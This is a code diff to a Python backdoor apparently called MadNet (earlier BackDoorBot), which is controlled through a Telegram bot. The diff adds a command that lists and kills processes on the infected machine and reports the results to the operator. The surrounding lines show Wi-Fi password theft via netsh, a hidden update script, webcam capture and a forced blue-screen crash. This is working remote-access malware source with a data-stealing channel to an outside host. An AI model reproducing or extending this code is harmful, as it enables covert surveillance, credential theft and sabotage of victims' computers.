@@ -13,6 +13,10 @@ from cryptography.fernet import Fernet
 import cv2
 
 
+VERSION = '2.0'
+NAME_PROGRAM = 'MadNet'
+
+
 name_file = "config"
 
 with open(name_file, 'rb') as file:
@@ -510,7 +514,8 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
 
             for profile in profiles:
 
-                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear')
+                profile_info = subprocess.check_output(
+                    f'netsh wlan show profile {profile} key=clear')
                 try:
                     profile_info = profile_info.decode('utf8').split('\n')
                 except:
@@ -551,7 +556,45 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
             bot.send_message(self.id, f'Ошибка: {e}')
 
         except:
-            print('*Webcam not found*')
+            logger.log(self.webcam.__name__, '*Webcam not found*')
+            bot.send_message(self.id, '*Webcam not found*')
+
+    def tasklist(self, pid):
+        if '.' == pid:
+            try:
+
+                prs = subprocess.Popen('tasklist', shell=True, stdout=subprocess.PIPE,
+                                       stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
+                try:
+                    pr_list = [prs[i].decode('cp866', 'ignore')
+                               for i in range(3, len(prs))]
+                except:
+                    pr_list = [prs[i].decode('utf8', 'ignore')
+                               for i in range(3, len(prs))]
+                a = [[], []]
+                out = 'Program | PID\n'
+                for i in pr_list:
+
+                    l = i.split()
+                    if l[2] == 'Console':
+                        if not l[0] in a[0]:
+                            a[0].append(l[0])
+                            a[1].append(l[1])
+
+                for i in range(len(a[0])):
+                    out += a[0][i].split('.exe')[0] + ' ' + a[1][i] + '\n'
+                bot.send_message(self.id, out)
+
+            except Exception as e:
+                logger.log(self.tasklist.__name__, e)
+                bot.send_message(self.id, f'Ошибка: {e}')
+        else:
+            lop = subprocess.Popen(f'taskkill /pid {pid}', shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()[0]
+            try:
+                bot.send_message(self.id, lop.decode('cp866'))
+            except:
+                bot.send_message(self.id, lop.decode('cp866'))
 
     def bsod(self):
         nullptr = ctypes.POINTER(ctypes.c_int)()
@@ -666,6 +709,9 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
                 if comnd == "wifi" or comnd == "extract_wifi_passwords":
                     self.extract_wifi_passwords()
 
+                if comnd == "tasklist" or comnd == "task":
+                    self.tasklist(text_comand[0])
+
                 if comnd == "bsod":
                     self.bsod()
 
@@ -688,7 +734,7 @@ func_api = Func_API()
 def start_message(message):
     if message.chat.id in id:
         bot.send_message(message.chat.id,
-                         "Список функций: \nhttps://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt")
+                         f'{NAME_PROGRAM} v{VERSION}\nName: {Data.name}\nСписок функций: https://github.com/DmodvGH/MadNet/blob/main/README.md"')
 
 
 @bot.message_handler(content_types=['text'])
